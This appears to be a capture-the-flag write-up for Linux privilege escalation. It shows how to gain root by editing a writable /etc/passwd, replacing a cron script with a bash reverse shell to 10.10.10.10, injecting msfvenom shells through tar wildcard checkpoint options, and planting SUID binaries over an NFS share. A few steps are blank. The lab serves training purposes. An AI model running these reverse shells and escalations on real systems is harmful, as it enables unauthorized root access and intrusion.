## 🔓 Task 5 – Weak File Permissions: Writable `/etc/passwd`

**Scenario:** `/etc/passwd` is world-writable.

```bash
openssl passwd newpasswordhere
```
Edit `/etc/passwd` and place the hash between the first and second colon (`:`) of root's row (replacing `x`). Then: `su root`

Alternatively, append a new root user:
```bash
echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
```

**Q: Run the "id" command as the newroot user. What is the result?**
> `uid=0(root) gid=0(root) groups=0(root)`

## ⏰ Task 8 – Cron Jobs: File Permissions

**Scenario:** Writable cron script.

```bash
cat /etc/crontab
locate overwrite.sh
ls -l /usr/local/bin/overwrite.sh   # world-writable
```
Replace `overwrite.sh` with:
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```
Set up netcat listener: `nc -nvlp 4444` → wait for cron → root shell.

Create `/home/user/overwrite.sh`:

Wait for cron, then: `/tmp/rootbash -p` → root shell.

## ⏰ Task 10 – Cron Jobs: Wildcards

**Scenario:** `tar` runs with wildcard `*` in cron job.

```bash
cat /usr/local/bin/compress.sh   # tar uses *
```
Generate reverse shell:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
chmod +x /home/user/shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
Wait for cron → root shell.

Cleanup:
```bash
rm /home/user/shell.elf /home/user/--checkpoint=1 /home/user/--checkpoint-action=exec=shell.elf
```

## 🌐 Task 19 – NFS: Root Squashing

**Scenario:** `/tmp` share has `no_root_squash` enabled.

```bash

```

On Kali as root:
```bash

mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
```
On target: `/tmp/shell.elf` → root shell.

**Q: What is the name of the option that disables root squashing?**

## 🏆 Key Takeaways
- Always check **file permissions** (`/etc/shadow`, `/etc/passwd`).
- **Sudo** misconfigurations and **environment variables** are common vectors.
- **Cron jobs** with writable scripts or wildcard injection are easy wins.
- **SUID binaries** and **PATH hijacking** can lead to root.
- **Kernel exploits** (Dirty COW) are last-resort but effective.
- **Automation scripts** help identify missed vectors.
